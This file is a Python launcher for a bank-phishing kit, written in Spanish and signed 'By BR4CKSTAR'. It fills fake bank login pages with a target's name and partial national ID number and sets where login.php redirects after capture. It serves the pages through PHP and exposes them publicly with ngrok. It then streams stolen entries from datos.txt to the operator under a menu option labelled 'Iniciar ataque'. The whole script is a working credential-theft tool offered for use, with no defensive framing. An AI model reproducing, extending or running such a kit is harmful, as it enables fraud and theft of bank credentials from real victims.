## Módulos a importar
import os
import time
import subprocess
import requests
import json

clearConsole = lambda: os.system('cls' if os.name in ('nt', 'dos') else 'clear')

def logo():
    print('\n888~~\       e      888b    | 888  /   888~-_   888   | 888 ,d88~~\ 888   |')
    print('888   |     d8b     |Y88b   | 888 /    888   \  888___| 888 8888    888___| ') 
    print('888 _/     /Y88b    | Y88b  | 888/\    888    | 888   | 888 `Y88b   888   | ') 
    print('888  \    /  Y88b   |  Y88b | 888  \   888   /  888   | 888  `Y88b, 888   |') 
    print('888   |  /____Y88b  |   Y88b| 888   \  888_-~   888   | 888    8888 888   |')
    print("888__/  /      Y88b |    Y888 888    \ 888      888   | 888 \__88P' 888   |")                                                                                                                                                                             
    print('                                By BR4CKSTAR')

def usuarionombre():
    with open('index.html', 'r') as archivo:
        lineas = archivo.readlines()
    name = input('Ingrese el nombre de usuario: \n     1- Atrás\nKeyphish:~$ ')
    lineas[16] = '        Felicidades '+name+', ingresa a tu banca web para continuar\n'
    with open('index.html', 'w') as archivo:
        archivo.writelines(lineas)
    if y==1:
         clearConsole()
         os.system("python3 bankphish.py")
    clearConsole()
    os.system("python3 bankphish.py")
    archivo.close()

def cedula():
    with open('digitalcode.html', 'r') as archivo:
        lineas = archivo.readlines()

    ced = input('Ingrese los ultimos 4 digitos de la cedula. \n     1- Atrás\nKeyphish:~$ ')

    lineas[16] = '        Los ultimos 4 digitos de su cedula son ***'+ced+'\n'

    with open('digitalcode.html', 'w') as archivo:
        archivo.writelines(lineas)

    if y==1:
         clearConsole()
         os.system("python3 bankphish.py")
    clearConsole()
    os.system("python3 bankphish.py")
    archivo.close()

def contra():
    ngrok()
    archivo = open("datos.txt", "r")
    lineas = archivo.readlines()
    archivo.close()
    for linea in lineas:
        print(linea, end='')

    while True:
        numero = input("\n\nIngrese un número para finalizar: ")
        if numero.isdigit():
            subprocess.Popen(['pkill', 'php'])
            subprocess.Popen(['pkill', 'ngrok'])
            break

        time.sleep(2)
        archivo = open("datos.txt", "r")
        lineas = archivo.readlines()
        archivo.close()

        for linea in lineas:
            print(linea)

def link():
    with open('login.php', 'r') as archivo:
        lineas = archivo.readlines()

    url = input('Ingrese el link a redireccionar. \n     1- Atrás\nKeyphish:~$ ')

    lineas[13] = "        header('Location:"+url+"');\n"

    with open('login.php', 'w') as archivo:
        archivo.writelines(lineas)
    archivo.close()
    clearConsole()
    os.system("python3 bankphish.py")


def ngrok():
    php_command = ['php', '-S', 'localhost:8080']
    php_process = subprocess.Popen(php_command)
    time.sleep(2)
    ngrok_command = ['ngrok', 'http', '8080']
    ngrok_process = subprocess.Popen(ngrok_command, stdout=subprocess.PIPE)
    time.sleep(2)
    ngrok_output = ngrok_process.stdout.readlines()
    public_url = ngrok_output[-1].strip().decode('utf-8')
    print(f'URL pública: {public_url}')


def dependencias():
    os.system("sudo apt install gnome-terminal php python3 python3-pip")
    clearConsole()
    os.system("""curl -s https://ngrok-agent.s3.amazonaws.com/ngrok.asc | sudo tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null && echo "deb https://ngrok-agent.s3.amazonaws.com buster main" | sudo tee /etc/apt/sources.list.d/ngrok.list && sudo apt update && sudo apt install ngrok""")
    clearConsole()
    print("         Instalación completa  ")
    time.sleep(3)
    clearConsole()
    os.system("python bankphish.py")

logo()
y=int(input("""             Bienvenido desea:
1- Iniciar ataque
2- Ingresar nombre usuario
3- Ingresar cedula
4- Ingresar link a redireccionar
5- Salir
0- Instalar dependencias
Keyphish:~$  """))

if y==0:
    clearConsole()
    logo()
    dependencias()

if y==1:
    clearConsole()
    logo()
    contra()
    

elif y==2:
    clearConsole()
    logo()
    usuarionombre()
    clearConsole()

elif y==3:
    clearConsole()
    logo()
    cedula()
    clearConsole()

elif y==4:
    clearConsole()
    logo()
    link()
    clearConsole()

elif y==5:
    print("  HASTA PRONTO!!")
    time.sleep(2)
    clearConsole()